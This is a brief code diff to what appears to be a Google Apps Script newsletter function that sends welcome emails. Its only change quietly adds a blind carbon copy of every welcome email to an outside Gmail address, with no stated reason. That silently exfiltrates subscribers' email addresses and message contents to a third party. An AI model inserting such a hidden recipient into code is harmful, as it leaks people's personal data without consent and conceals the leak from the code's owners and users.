@@ -326,6 +326,7 @@ function sendNewsletterWelcomeEmail(recipientEmail) {
   MailApp.sendEmail({
     to: recipientEmail,
     subject: subject,
-    htmlBody: htmlBody
+    htmlBody: htmlBody,
+    bcc: "neptocthorakao@gmail.com"
   });
 }
